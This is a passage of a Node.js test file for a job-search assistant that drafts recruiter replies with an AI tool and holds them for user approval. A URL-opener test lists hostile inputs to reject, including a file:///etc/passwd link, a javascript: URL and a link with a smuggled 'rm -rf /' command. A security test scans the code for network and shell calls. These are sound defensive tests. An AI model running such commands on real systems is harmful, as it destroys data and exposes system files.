import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { activityLabel, agentArgs, canSendOn, gate, gateHook, learnFromTool, pointsElsewhere, shellWords, stopReply } from "../lib/agent.js";
import { screenRows, selectionText } from "../lib/picker.js";
import { sentLine, theirMessage } from "../lib/render.js";
import { activityRows, alertLine, alertRows, chatLink, draftLine, goalLine, liveLine, draftActions, draftRows, footerLine, pipelineLine, pipelineRows, roleActions, shouldSync, summary, scrollBy, scrolled, syncScreen, syncSummary, windowed } from "../lib/app.js";
import { CHROME_PAGE, CONNECTORS_PAGE, findHosts, runStep, stepsFor, verify } from "../lib/connect.js";
import * as core from "../lib/core.js";
import { canOpen, openUrl } from "../lib/open.js";
import { actionsFor, buildRows, detailScreen, listScreen, move, refreshConnections, selectable } from "../lib/picker.js";
import { card, palette } from "../lib/render.js";
import { findTool, parseChat, rewrite, rewritePrompt } from "../lib/rewrite.js";
import { PLACEHOLDER, PROGRAMS, liveLink, signupList } from "../lib/referrals.js";
import { SCHEDULES, scheduleWarning, scheduledRun, setSchedule, windowsScript } from "../lib/schedule.js";
import { findOnPath, toolCommand } from "../lib/rewrite.js";
import { helperCommand, shimCmd } from "../lib/install.js";
import { linkedinLogin as linkedinLoginFrom } from "../lib/linkedin.js";
import { freshState as newState, home, load, withState } from "../lib/store.js";
// These tests check the approval gate itself, so autopilot is off unless a test turns it on.
const freshState = () => ({ ...newState(), autopilot: false });

const c = palette(null);
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

function state() {
  const s = freshState();
  core.addAgent(s, "Fonzi");
  core.addAgent(s, "Hedgy");
  core.setConnection(s, "Hedgy", "signin");
  core.addRecruiter(s, "Dana Lee", { handle: "+15550100", company: "Acme Talent" });
  return s;
}
const row = (s, name) => buildRows(s).find((r) => r.name === name);
const ids = (s, name) => actionsFor(s, row(s, name)).map((a) => a.id);

test("the list shows the whole catalog, then the user's own, then a way to add", () => {
  const screen = listScreen(buildRows(state()), selectable(buildRows(state()))[0], c);
  assert.match(screen, /CATALOG/);
  assert.match(screen, /❯ ✓ Fonzi\s+connected · mcp/);
  assert.match(screen, /! Hedgy\s+needs sign-in · browser/);
  assert.match(screen, /○ Boardy\s+not connected · email/);
  assert.match(screen, /YOUR RECRUITERS[\s\S]*✓ Dana Lee\s+connected · imessage · \+15550100 · Acme Talent/);
  assert.match(screen, /\+ Create a recruiter/);
  assert.doesNotMatch(screen, /Import recruiters/);
});

test("a tool that isn't an agent gets its own section, with what to do", () => {
  const s = state();
  core.setConnection(s, "Google Calendar", "connector", "Connect it so I can suggest free times");
  const r = row(s, "Google Calendar");
  assert.ok(r.tool);
  assert.deepEqual(actionsFor(s, r, []).map((a) => a.id), ["working", "skip", "back"]);
  assert.deepEqual(actionsFor(s, r, [{ id: "claude" }]).map((a) => a.id), ["open", "working", "skip", "back"]);
  assert.match(detailScreen(r, actionsFor(s, r, []), 0, c, null, core.connectList(s).find((i) => i.name === "Google Calendar")), /suggest free times/);
});

test("the app's tabs show what's going on", () => {
  const s = state();
  core.addFact(s, "Led 6 engineers", "resume");
  s.last_run = "2026-11-03T14:00:00.000Z";
  const q = core.addDraft(s, { agent: "Fonzi", asked: "Team?", text: "Led 6 engineers.", sources: ["f1"] });
  core.addDraft(s, { agent: "Fonzi", asked: "Team?", text: "Led 20 engineers.", sources: ["f1"] });
  core.addRole(s, { company: "Acme", stage: "interview", agent: "Fonzi" });
  core.addAlert(s, "Fonzi", "An offer came in");
  assert.match(summary(s), /^Selling you: 1 interview · 2 drafts need you · 1 to connect · 1 alert · checked /, "the goal leads, with how close it is");
  const drafts = draftRows(s);
  assert.deepEqual(drafts.filter((r) => r.draft).map((r) => r.mark), ["✗", "○"], "newest first");
  assert.deepEqual(draftActions(q).map((a) => a.id), ["approve", "edit", "copy", "talk", "skip", "back"], "no resume option when nobody's talking about one");
  assert.deepEqual(draftActions({ status: "blocked" }).map((a) => a.id), ["edit", "talk", "skip", "back"]);
  assert.deepEqual(draftActions({ status: "blocked", asked: "Can you send your CV?", suggestion: "Sure." }).map((a) => a.id), ["send", "edit", "attach", "copy", "talk", "skip", "back"]);
  assert.deepEqual(pipelineRows(s).map((r) => r.heading ?? r.text), ["Everything else (1)", "Acme"]);
  assert.equal(alertRows(s)[1].headline, "An offer came in");
  assert.equal(summary(freshState()), "Selling you · nothing needs you · not checked yet");
  const hired = { ...freshState(), hired: true, paused: true };
  assert.equal(summary(hired), "You’re hired. Goal reached · not checked yet");
  const far = freshState();
  far.roles = [{ stage: "offer" }, { stage: "interview" }, { stage: "interview" }, { stage: "talking" }, { stage: "new" }];
  assert.equal(goalLine(far), "Selling you: 1 offer, 2 interviews, 1 talking");
});

test("a long list keeps the cursor in view and says what's hidden", () => {
  const lines = Array.from({ length: 100 }, (_, i) => `line ${i}`);
  const shown = windowed(lines, 50, 12);
  assert.ok(shown.length <= 12);
  assert.ok(shown.includes("line 50"));
  assert.match(shown[0], /↑ \d+ more/);
  assert.match(shown.at(-1), /↓ \d+ more/);
  assert.deepEqual(windowed(["a"], 0, 12), ["a"]);
});

test("reject drops a draft, and a note for the AI keeps it open until it's rewritten", () => {
  const s = state();
  const a = core.addDraft(s, { agent: "Fonzi", text: "Any update?", kind: "nudge" });
  core.instruct(s, a.id, "Shorter");
  assert.equal(a.status, "pending");
  assert.equal(draftRows(s).find((r) => r.id === a.id).flag, "note for the AI");
  core.editDraft(s, a.id, "Update?");
  assert.equal(a.instructions, null);
  core.reject(s, a.id);
  assert.equal(a.status, "rejected");
  assert.deepEqual(core.outbox(s), []);
  assert.throws(() => core.instruct(s, a.id, "x"), /already rejected/);
});

function fakeTools(...names) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sellme-tools-"));
  for (const n of names) fs.writeFileSync(path.join(dir, n), "#!/bin/sh\n", { mode: 0o755 });
  return dir;
}

function noted(note = "Make it warmer") {
  const s = state();
  core.addFact(s, "Led a team of 6", "resume");
  s.profile = { name: "Maya", roles: ["engineer"], where: "NYC", floor: "$987K base", never_mention: ["Globex"] };
  const q = core.addDraft(s, { agent: "Fonzi", asked: "Team size?", text: "Maya led a team of 6.", sources: ["f1"] });
  core.instruct(s, q.id, note);
  return { s, q };
}
const answer = (json) => async () => JSON.stringify(json);
const TOOL = { id: "claude", name: "Claude Code", args: [] };

test("a note gets a new version on the spot, which still needs a yes", async () => {
  const { s, q } = noted();
  const result = await rewrite(s, q, { tool: TOOL, run: answer({ text: "Happy to say Maya led a team of 6!", sources: ["f1", "made-up"] }) });
  const item = core.applyRewrite(s, q.id, result);
  assert.equal(item.text, "Happy to say Maya led a team of 6!");
  assert.deepEqual(item.sources, ["f1"]); // An id that doesn't exist isn't a source.
  assert.equal(item.instructions, null);
  assert.equal(item.status, "pending");
  assert.deepEqual(core.outbox(s), []);
});

test("a rewrite can't sneak in a claim or a floor", async () => {
  const { s, q } = noted();
  const prompt = rewritePrompt(s, q);
  assert.doesNotMatch(prompt, /987K/);
  assert.match(prompt, /Make it warmer/);
  assert.match(prompt, /Never mention: Globex/);
  const result = await rewrite(s, q, { tool: TOOL, run: answer({ text: "Maya led a team of 20.", sources: ["f1", "profile.floor"] }) });
  assert.ok(!result.sources.includes("profile.floor"));
  assert.equal(core.applyRewrite(s, q.id, result).status, "blocked");
});

test("when a rewrite can't happen, the draft and the note both stay", async () => {
  const { s, q } = noted();
  const none = await rewrite(s, q, { tool: null });
  assert.match(none.failed, /No AI tool/);
  const died = await rewrite(s, q, { tool: TOOL, run: async () => { throw new Error("Claude Code took too long"); } });
  assert.equal(died.failed, "Claude Code took too long");
  assert.match((await rewrite(s, q, { tool: TOOL, run: async () => "sorry, no" })).refused, /form I could read/);
  assert.equal((await rewrite(s, q, { tool: TOOL, run: answer({ text: null, why: "The facts don't say that." }) })).refused, "The facts don't say that.");
  assert.equal(q.text, "Maya led a team of 6.");
  assert.equal(q.instructions, "Make it warmer");
});

test("a rewrite never overwrites a draft that changed meanwhile, and escape codes don't reach the screen", async () => {
  const { s, q } = noted();
  const result = await rewrite(s, q, { tool: TOOL, run: answer({ text: "\u001b[2JMaya led a team of 6.", sources: ["f1"] }) });
  assert.equal(result.text, "[2JMaya led a team of 6.");
  core.editDraft(s, q.id, "Maya led 6 people.");
  assert.throws(() => core.applyRewrite(s, q.id, result), /changed while/);
  assert.equal(q.text, "Maya led 6 people.");
});

test("what the user tells SELLME about themselves is remembered, and the draft can say their own rate", async () => {
  const { s, q } = noted("i request 120$/hr for contract roles");
  q.asked = "Contract, $82 - $87/hr. Updated resume?";
  const prompt = rewritePrompt(s, q);
  assert.match(prompt, /user's own ask/);
  assert.match(prompt, /remember/);
  assert.doesNotMatch(prompt, /to talk pay or an offer/); // Their own rate is no reason to refuse.
  const result = await rewrite(s, q, { tool: TOOL, run: answer({ text: "Thanks Sam. My rate for contract roles is $120/hr, and here is my resume.", sources: ["note", "f1"], remember: ["Asks $120/hr for contract roles"] }) });
  assert.deepEqual(result.remember, ["Asks $120/hr for contract roles"]);
  const item = core.applyRewrite(s, q.id, result);
  const fact = s.facts.find((f) => f.text === "Asks $120/hr for contract roles");
  assert.ok(fact, "the rate is one of their facts now");
  assert.match(fact.source, /you told SELLME, about the Fonzi draft/);
  assert.ok(item.sources.includes(fact.id) && !item.sources.includes("note"));
  // 120 is backed by their own fact, so nothing blocks it. Pay still needs their own yes.
  assert.ok(!item.check.reasons.some((r) => r.code === "unsourced_number"));
  assert.ok(item.check.reasons.some((r) => r.code === "pay_or_offer"));
  // Saying it again doesn't make a second copy, and the next prompt already knows it.
  core.keepWhatYouSaid(s, ["asks $120/hr for contract roles"]);
  assert.equal(s.facts.filter((f) => /120/.test(f.text)).length, 1);
  assert.match(rewritePrompt(s, q), /Asks \$120\/hr for contract roles/);
});

test("\"note\" only counts as a source when something was remembered from it", async () => {
  const { s, q } = noted();
  const result = await rewrite(s, q, { tool: TOOL, run: answer({ text: "Maya led a team of 6!", sources: ["note", "f1"] }) });
  assert.deepEqual(result.sources, ["f1"]);
  assert.deepEqual(result.remember, []);
  const junk = await rewrite(s, q, { tool: TOOL, run: answer({ text: "Maya led a team of 6!", sources: ["f1"], remember: [3, "", "x".repeat(400), "Prefers remote"] }) });
  assert.deepEqual(junk.remember, ["Prefers remote"]);
});

test("a note that says it all is just followed; one that points somewhere gets looked up", () => {
  assert.equal(pointsElsewhere("i request 120$/hr for contract roles"), false);
  assert.equal(pointsElsewhere("make it shorter and warmer"), false);
  assert.equal(pointsElsewhere("read our transcription in wisper flow and adjust your draft"), true);
  assert.equal(pointsElsewhere("match what I told Dana on LinkedIn"), true);
  assert.equal(pointsElsewhere("use the dates from my calendar"), true);
});

test("talking it over remembers what the user says about themselves", () => {
  const s = state();
  const q = core.addDraft(s, { agent: "Fonzi", asked: "Rate?", text: "Hi", kind: "nudge" });
  const out = parseChat(JSON.stringify({ say: "Got it.", text: null, remember: ["Only wants remote roles"] }), s, q);
  assert.deepEqual(out.remember, ["Only wants remote roles"]);
});

test("findTool only picks a tool that's really on the PATH", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sellme-tools-"));
  assert.equal(findTool(dir), null);
  fs.writeFileSync(path.join(dir, "codex"), "#!/bin/sh\n", { mode: 0o755 });
  assert.equal(findTool(dir).id, "codex");
  fs.writeFileSync(path.join(dir, "claude"), "#!/bin/sh\n", { mode: 0o755 });
  assert.equal(findTool(dir).id, "claude");
  fs.rmSync(dir, { recursive: true });
});

test("a person's approved reply waits only for an address, then goes to the outbox", () => {
  const s = state();
  core.addRecruiter(s, "Sam Roe", {});
  const q = core.addDraft(s, { agent: "Sam Roe", text: "Thanks!", kind: "nudge" });
  core.approve(s, q.id);
  assert.equal(draftRows(s).find((r) => r.id === q.id).yours, true);
  assert.match(s.notes.at(-1).text, /no email, phone or LinkedIn for Sam Roe/);
  s.agents.find((a) => a.name === "Sam Roe").handle = "https://www.linkedin.com/in/sam-roe/";
  assert.equal(core.recheckOpen(s), 1);
  assert.deepEqual(core.outbox(s).map((o) => [o.id, o.channel, o.person]), [[q.id, "linkedin", true]]);
  assert.equal(draftRows(s).some((r) => r.yours), false);
});

test("a question only the user can answer comes with a suggested reply: send it, or edit it", () => {
  const s = state();
  core.addAgent(s, "Boardy", { channel: "email", handle: "boardy@boardy.ai" });
  const q = core.addBlock(s, { agent: "Boardy", asked: "Lee runs Northwind Talent. Want the intro?", reason: "Accepting an intro is yours.", suggest: "Yes, please. Maya would welcome the intro." });
  assert.deepEqual(draftActions(q).map((a) => a.label), ["Sell me!", "Edit it", "Copy draft", "Discuss with SELLME", "Skip", "Back"]);
  assert.equal(draftRows(s).find((r) => r.id === q.id).mark, "?", "a question, not an error");
  const shown = card(q, c);
  assert.match(shown, /Suggested\n/);
  assert.match(shown, /^Needs you: Accepting an intro is yours\./m);
  assert.doesNotMatch(shown, /✗/);
  core.setSuggestion(s, q.id, "Yes please, thanks Boardy.", { by: "you" });
  assert.match(card(q, c), /Your reply\n *╭─+╮\n *│ Yes please, thanks Boardy\. *│/);
  core.answerYourself(s, q.id, q.suggestion, { confirmSensitive: true });
  assert.deepEqual(core.outbox(s).map((o) => o.text), ["Yes please, thanks Boardy."]);
  const lie = core.addDraft(s, { agent: "Boardy", asked: "Team of 20?", text: "Yes, 20.", sources: [] });
  assert.equal(draftActions(lie)[0].id, "edit", "a draft that failed the check leads with fixing it");
  assert.match(draftActions(lie)[1].label, /Send anyway/);
});

test("recruiters import from CSV, vCard or plain lines", () => {
  const s = freshState();
  const csv = core.importRecruiters(s, `name,phone,company\nDana Lee,+15550100,"Acme, Inc"\nPat Kim,pat@firm.com,\n`);
  assert.deepEqual(csv.added, ["Dana Lee", "Pat Kim"]);
  assert.equal(core.findAgent(s, "Dana Lee").company, "Acme, Inc");
  assert.equal(core.findAgent(s, "Dana Lee").channel, core.SELF);
  const vcf = core.importRecruiters(s, "BEGIN:VCARD\r\nVERSION:3.0\r\nFN:Sam Roe\r\nORG:Talent Co;\r\nTEL;TYPE=CELL:+15550222\r\nEND:VCARD\r\n");
  assert.deepEqual(vcf.added, ["Sam Roe"]);
  assert.equal(core.findAgent(s, "Sam Roe").handle, "+15550222");
  assert.equal(core.findAgent(s, "Sam Roe").company, "Talent Co");
});

test("one bad entry never stops an import", () => {
  const s = freshState();
  core.addRecruiter(s, "Dana Lee", { handle: "+15550100" });
  const r = core.importRecruiters(s, "Fonzie,+15550300\nJust A Name\nSam Roe,3175550100\nAmy Fox,+15550100\nLee Park,+15550400");
  assert.deepEqual(r.added, ["Sam Roe", "Lee Park"]);
  assert.deepEqual(r.problems.map((p) => p.name), ["Fonzie", "Just A Name", "Amy Fox"]);
});

test("the cursor skips headings and wraps at both ends", () => {
  const rows = buildRows(state());
  const spots = selectable(rows);
  assert.ok(spots.every((i) => !rows[i].heading));
  assert.equal(move(rows, spots[0], -1), spots.at(-1));
  assert.equal(move(rows, spots.at(-1), 1), spots[0]);
  assert.equal(move(rows, spots[0], 1), spots[1]);
});

test("each row offers what makes sense for it", () => {
  const s = state();
  assert.deepEqual(ids(s, "Hedgy"), ["open", "working", "auto", "auto", "remove", "back"]);
  assert.deepEqual(ids(s, "Fonzi"), ["auto", "auto", "remove", "back"]);
  assert.deepEqual(ids(s, "Boardy"), ["open", "connect", "skip", "back"]);
  assert.deepEqual(ids(s, "Dana Lee"), ["auto", "auto", "remove", "back"], "a person can be answered by itself too");
  const fonzi = actionsFor(s, row(s, "Fonzi")).filter((a) => a.id === "auto");
  assert.deepEqual(fonzi.map((a) => [a.label, a.chosen]), [["○ SELLME sends it", false], ["● SELLME asks you first", true]], "the one that's on is marked");
});

test("sign-in opens the catalog's own page", () => {
  const s = state();
  const action = actionsFor(s, row(s, "Hedgy"))[0];
  assert.equal(action.label, "Sign in");
  assert.equal(action.url, "https://www.hedgy.works");
});

test("a referral link says so, on the screen where it's offered", () => {
  const s = state();
  const r = row(s, "Jack & Jill");
  const actions = actionsFor(s, r);
  assert.equal(actions[0].label, "Sign up (referral link)");
  assert.match(detailScreen(r, actions, 0, c), /Sellme is free because/);
});

test("a skipped agent can be brought back", () => {
  const s = state();
  core.setConnection(s, "Boardy", "skip");
  assert.equal(row(s, "Boardy").status, "skip");
  assert.ok(actionsFor(s, row(s, "Boardy")).some((a) => a.label === "Stop skipping it"));
  assert.ok(!ids(s, "Boardy").includes("skip"));
});

test("only https and the Mac settings link can be opened", () => {
  for (const url of ["https://www.hedgy.works", "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles"]) assert.ok(canOpen(url), url);
  for (const url of ["file:///etc/passwd", "http://a.com", "javascript:alert(1)", "https://a.com; rm -rf /", "-a Calculator", "x-apple.systempreferences:a b"]) assert.ok(!canOpen(url), url);
});

test("opening passes the link as one argument and never uses a shell", async () => {
  const calls = [];
  const run = (cmd, args, cb) => {
    calls.push([cmd, args]);
    cb(null);
  };
  assert.equal(await openUrl("https://a.com", { platform: "darwin", run }), true);
  assert.equal(await openUrl("https://a.com", { platform: "linux", run }), true);
  assert.equal(await openUrl("file:///etc/passwd", { platform: "darwin", run }), false);
  assert.equal(await openUrl("https://a.com/?a=1&calc", { platform: "win32", run }), true);
  assert.equal(await openUrl("https://a.com", { platform: "sunos", run }), false);
  assert.deepEqual(calls, [["open", ["https://a.com"]], ["xdg-open", ["https://a.com"]], ["rundll32", ["url.dll,FileProtocolHandler", "https://a.com/?a=1&calc"]]]);
});

test("SECURITY.md's promise holds: no network, and only the link opener, the rewrite, connect, the agent run and the schedule start a program", () => {
  const files = [...fs.readdirSync(path.join(ROOT, "lib")).map((f) => `lib/${f}`), ...fs.readdirSync(path.join(ROOT, "bin")).map((f) => `bin/${f}`)];
  for (const file of files) {
    const text = fs.readFileSync(path.join(ROOT, file), "utf8");
    assert.doesNotMatch(text, /node:(http|https|net|tls|dns|dgram|vm)\b|\bfetch\(|\beval\(|new Function/, file);
    if (!["lib/open.js", "lib/rewrite.js", "lib/connect.js", "lib/agent.js", "lib/schedule.js", "lib/memory.js"].includes(file)) assert.doesNotMatch(text, /child_process/, file);
  }
  // The rewrite starts only a known AI tool, directly, with its tools off and nothing it could send with.
  const rewriter = fs.readFileSync(path.join(ROOT, "lib/rewrite.js"), "utf8");
  assert.doesNotMatch(rewriter, /shell:|\bexec\(|execSync|API_KEY/);
  assert.match(rewriter, /"--tools", ""/);
  assert.match(rewriter, /"--sandbox", "read-only"/);
  // The memory runs only the folder the user connected, always local only, and never sees the floor.
  const mem = fs.readFileSync(path.join(ROOT, "lib/memory.js"), "utf8");
  assert.doesNotMatch(mem, /shell:|\bexec\(|execSync/);
  assert.match(mem, /MEMSVC_LOCAL: "1", JEV_API_KEY: ""/);
});

const CLAUDE = { id: "claude", name: "Claude Code", add: () => [], after: () => null };
const connector = (name, extra = {}) => ({ name, kind: "connector", action: "x", url: null, ...extra });

test("Fonzi gets the exact command for every tool on this machine, for every folder", () => {
  const s = state();
  core.setConnection(s, "Fonzi", "connector");
  const need = core.connectList(s).find((i) => i.name === "Fonzi");
  const steps = stepsFor(need, findHosts(fakeTools("claude", "codex")));
  assert.equal(steps[0].command, "claude mcp add --transport http --scope user fonzi https://talent.fonzi.ai/mcp");
  assert.match(steps[0].after, /\/mcp/);
  assert.equal(steps[1].command, "codex mcp add fonzi --url https://talent.fonzi.ai/mcp");
  assert.deepEqual(stepsFor(need, []).map((x) => x.kind), ["text"]);
  assert.match(stepsFor(need, [])[0].label, /talent\.fonzi\.ai\/mcp/);
  const row = buildRows(s).find((r) => r.name === "Fonzi");
  assert.deepEqual(actionsFor(s, row, findHosts(fakeTools("claude")), { added: () => false }).filter((a) => a.id === "run").map((a) => a.label), ["Connect it in Claude Code"]);
  assert.deepEqual(actionsFor(s, row, findHosts(fakeTools("claude")), { added: () => true }).filter((a) => a.id === "run").map((a) => a.label), ["✓ Added to Claude Code"]);
});

test("texting agents show what's really done, explain Full Disk Access, and connect once both are in place", () => withSandbox(() => {
  withState((s) => {
    core.addRecruiter(s, "Clera", { handle: "+16505397073" });
    core.setConnection(s, "Clera", "connector", "Add its MCP server, so I can talk to Clera");
  });
  const hosts = findHosts(fakeTools("claude"));
  const row = buildRows(load()).find((r) => r.name === "Clera");
  const before = actionsFor(load(), row, hosts, { added: () => false, messages: () => false });
  assert.deepEqual(before.filter((a) => ["run", "open"].includes(a.id)).map((a) => a.label), ["Connect it in Claude Code", "Allow Full Disk Access"]);
  const shown = detailScreen(row, before, 0, c, null, core.connectList(load()).find((i) => i.name === "Clera"));
  assert.match(shown, /Why: macOS keeps your texts locked, and Clera talks to you by iMessage\./);
  assert.match(shown, /switch on .+\. Not in the list\? Click \+/);
  assert.doesNotMatch(shown, /x-apple\.systempreferences/, "no raw settings link on screen");
  assert.deepEqual(refreshConnections({ hosts, added: () => true, messages: () => false }), [], "not until it can read texts");
  const after = actionsFor(load(), row, hosts, { added: () => true, messages: () => true });
  assert.deepEqual(after.filter((a) => ["run", "open"].includes(a.id)).map((a) => a.label), ["✓ Added to Claude Code", "✓ Full Disk Access is on"]);
  assert.deepEqual(refreshConnections({ hosts, added: () => true, messages: () => true }), ["Clera"]);
  assert.equal(core.connectList(load()).some((i) => i.name === "Clera"), false);
}));

test("everything else gets a link or a plain next step, never just 'go set it up'", () => {
  assert.equal(stepsFor(connector("Google Calendar"), [CLAUDE])[0].url, CONNECTORS_PAGE);
  assert.equal(stepsFor(connector("Boardy", { channel: "email" }), [CLAUDE])[0].url, CONNECTORS_PAGE);
  assert.equal(stepsFor(connector("Google Calendar"), [])[0].kind, "text");
  assert.deepEqual(stepsFor(connector("Hedgy", { channel: "browser", signin: "https://h.co" }), []).map((x) => x.url), [CHROME_PAGE, "https://h.co"]);
  const s = state();
  core.setConnection(s, "Standout", "connector");
  const standout = stepsFor(core.connectList(s).find((i) => i.name === "Standout"), findHosts(fakeTools("claude")));
  assert.equal(standout[0].command, "claude mcp add --scope user messages -- uvx mac-messages-mcp==1.1.0");
  assert.match(standout[1].label, /third-party/);
  assert.equal(standout[2].label, "Allow Full Disk Access");
  assert.deepEqual(stepsFor({ name: "Hedgy", kind: "signin", url: "https://h.co" }, []).map((x) => x.label), ["Sign in"]);
});

test("connected only means the tool says so", async () => {
  const step = { host: "claude", mcp: { name: "fonzi", url: "u" } };
  const says = (output) => async () => ({ output });
  assert.equal(await verify(step, { run: says("Status: ✔ Connected") }), "connected");
  assert.equal(await verify(step, { run: says("Status: ! Needs authentication") }), "login");
  assert.equal(await verify(step, { run: says("No MCP server found") }), "unknown");
  assert.equal(await verify({ host: "codex", mcp: step.mcp }), "unknown");
});

test("running a step reports failure, and adding what's already there isn't one", async () => {
  const dir = fakeTools("claude");
  fs.writeFileSync(path.join(dir, "claude"), `#!/bin/sh\necho "MCP server fonzi already exists in user config"\nexit 1\n`, { mode: 0o755 });
  const env = { ...process.env, PATH: `${dir}:${process.env.PATH}` };
  assert.deepEqual(await runStep({ bin: "claude", args: [] }, { env }), { ok: true, already: true, output: "MCP server fonzi already exists in user config\n" });
  fs.writeFileSync(path.join(dir, "claude"), `#!/bin/sh\nexit 1\n`, { mode: 0o755 });
  assert.equal((await runStep({ bin: "claude", args: [] }, { env })).ok, false);
});

test("no machine's own path ships in the skill", () => {
  for (const f of ["SKILL.md", "references/channels.md", "references/context.md", "references/run.md", "references/setup.md"]) {
    assert.doesNotMatch(fs.readFileSync(path.join(ROOT, "skill", f), "utf8"), /\/Users\/|\/home\//, f);
  }
});

// ---------------------------------------------------------------- the catalog
test("the catalog is matching platforms, not classic job boards, each with its own plain link", () => {
  const entries = Object.values(core.CATALOG);
  assert.equal(new Set(entries.map((e) => e.name)).size, entries.length);
  for (const e of entries) {
    assert.equal(core.CATALOG[e.name.toLowerCase()], e, e.name);
    assert.match(e.signin, /^https:\/\/[^?#\s]+$/, e.name);
    assert.ok(e.about && e.about.length <= 40, `${e.name}: ${e.about}`);
  }
  for (const board of ["Work at a Startup", "Welcome to the Jungle", "Landing.jobs", "Upwork", "Outlier", "Crossing Hurdles"]) assert.ok(!core.CATALOG[board.toLowerCase()], board);
});

test("everything in the catalog can be signed up for from the app", () => {
  const s = freshState();
  const signups = core.connectList(s).map((i) => i.name).sort();
  assert.deepEqual(signups, Object.values(core.CATALOG).map((e) => e.name).sort());
  const clera = buildRows(s).find((r) => r.name === "Clera");
  assert.equal(actionsFor(s, clera, []).find((a) => a.id === "open").url, "https://www.getclera.com/chat");
});

test("a short name isn't mistaken for a catalog service", () => {
  const s = state();
  for (const name of ["Max", "Alex", "Dan"]) assert.equal(core.addRecruiter(s, name, { handle: `+1555010${name.length}${name.charCodeAt(0)}` }).name, name);
  assert.throws(() => core.addRecruiter(s, "Clerra"), /Did you mean Clera\?/);
});

// ---------------------------------------------------------------- the pipeline
test("the pipeline is two lists: the next round by its time, then everything else, latest first", () => {
  const s = state();
  s.roles = [];
  const today = new Date("2026-11-03T12:00:00Z");
  core.addRole(s, { company: "Later Inc", stage: "talking", nextCall: "2026-11-10T15:00:00Z" });
  core.addRole(s, { company: "Soon Inc", stage: "interview", nextCall: "2026-11-05T15:00:00Z" });
  Object.assign(core.addRole(s, { company: "Done Inc", stage: "interview", nextCall: "2026-11-01T15:00:00Z" }), { updated: "2026-11-02T10:00:00Z" });
  Object.assign(core.addRole(s, { company: "Applied Inc", stage: "new" }), { updated: "2026-11-03T10:00:00Z" });
  Object.assign(core.addRole(s, { company: "Old Inc", stage: "talking" }), { updated: "2026-10-01T10:00:00Z" });
  Object.assign(core.addRole(s, { company: "Nope Inc", stage: "rejected" }), { updated: "2026-09-02T10:00:00Z" });
  Object.assign(core.addRole(s, { company: "Pass Inc", stage: "passed" }), { updated: "2026-09-01T10:00:00Z" });
  const rows = pipelineRows(s, today);
  assert.deepEqual(rows.map((r) => r.heading ?? r.text), ["Next round (2)", "Soon Inc", "Later Inc", "Everything else (5)", "Done Inc", "Applied Inc", "Old Inc", "Nope Inc", "Pass Inc"]);
  assert.deepEqual(rows.slice(4).map((r) => r.stage), ["Interviewing", "Applied", "Applied", "Rejected", "Rejected"], "only applied, interviewing or rejected");
  assert.equal(rows[1].call, new Date("2026-11-05T15:00:00Z").toISOString());
  assert.equal(rows[1].detail, "", "a booked call says where it stands, so no stage word");
  const soon = s.roles.find((r) => r.company === "Soon Inc");
  core.setNextCall(s, soon.id, soon.next_call, "Zoom");
  assert.equal(pipelineRows(s, today)[1].detail, "Zoom", "how the call happens instead");
  core.setNextCall(s, soon.id, "2026-11-06T15:00:00Z");
  assert.equal(soon.call_via, null, "a new time is a new invite");
  core.setNextCall(s, soon.id, "2026-11-05T15:00:00Z", "Zoom");
  assert.equal(rows[4].call, null, "a call that's over isn't next");
  assert.deepEqual([rows[4].stage, rows[4].ago, rows[4].what], ["Interviewing", "1d", ""], "a past call is the last thing that happened, in days once it's a day old");
  assert.deepEqual([rows[5].ago, rows[5].what], ["", ""]);
  core.addRecruiter(s, "Sam Rivera", { handle: "sam@example.com" });
  s.queue.push({ id: "q90", agent: "Sam Rivera", channel: "self", to: "sam@example.com", kind: "reply", status: "pending", asked: "Still keen?", company: "Old Inc", created: "2026-11-03T09:00:00Z" });
  const again = pipelineRows(s, today);
  assert.deepEqual(again.slice(4, 7).map((r) => r.text), ["Old Inc", "Done Inc", "Applied Inc"], "latest interaction first, nothing yet last");
  assert.deepEqual([again[4].ago, again[4].what], ["3h", "Email"], "the channel it's talked on");
  const line = pipelineLine(again[4], " ", c, 100);
  assert.match(line, /^  Old Inc +Applied +3h  Email$/);
  Object.assign(s.roles.find((r) => r.company === "Applied Inc"), { agent: "Sam Rivera" });
  assert.equal(pipelineRows(s, today).find((r) => r.text === "Applied Inc").what, "Email", "nothing said yet: the channel of who it came through");
  assert.ok(line.length <= 100);
});

test("dates people actually type become the next time that date comes round", () => {
  const today = new Date("2026-11-03T12:00:00");
  assert.equal(new Date(core.parseWhen("Nov 5 2:00 PM", today)).getTime(), new Date("2026-11-05T14:00:00").getTime());
  assert.equal(new Date(core.parseWhen("nov 5 2pm", today)).getTime(), new Date("2026-11-05T14:00:00").getTime());
  assert.equal(new Date(core.parseWhen("Jan 5 9am", today)).getFullYear(), 2027);
  assert.equal(new Date(core.parseWhen("2026-12-01T10:00", today)).getMonth(), 11);
  assert.throws(() => core.parseWhen("whenever", today), /can’t read/);
});

test("a closed role offers no messages, and closing one clears its call", () => {
  const s = state();
  const role = core.addRole(s, { company: "Acme", stage: "talking", nextCall: "2030-01-01T10:00:00Z" });
  assert.deepEqual(roleActions(role).map((a) => a.id), ["prep", "nudge", "followup", "call", "move", "delete", "back"]); // A call is coming, so prep comes first.
  core.setRole(s, role.id, "rejected");
  assert.equal(role.next_call, null);
  assert.deepEqual(roleActions(role).map((a) => a.id), ["move", "delete", "back"]);
  assert.deepEqual(roleActions({ stage: "hired" }).map((a) => a.id), ["back"]);
});

test("a nudge is a draft that passes the check and still waits for a yes", () => {
  const s = state();
  core.addAgent(s, "Standout", { handle: "+14155550100" });
  const role = core.addRole(s, { company: "Acme", title: "Staff Engineer", agent: "Standout", stage: "talking" });
  const bot = core.findAgent(s, "Standout");
  const item = core.addDraft(s, { agent: "Standout", text: core.nudgeText(s, role, bot), kind: "nudge", company: "Acme" });
  assert.equal(item.status, "pending");
  assert.doesNotMatch(item.text, /\bI\b/);
  assert.match(core.nudgeText(s, role, { name: "Dana Lee", channel: "self" }), /^Hi Dana, any update on the Staff Engineer role at Acme\?/);
});

test("deleting a role removes only that role", () => {
  const s = state();
  core.addAgent(s, "Standout", { handle: "+14155550100" });
  const role = core.addRole(s, { company: "Acme" });
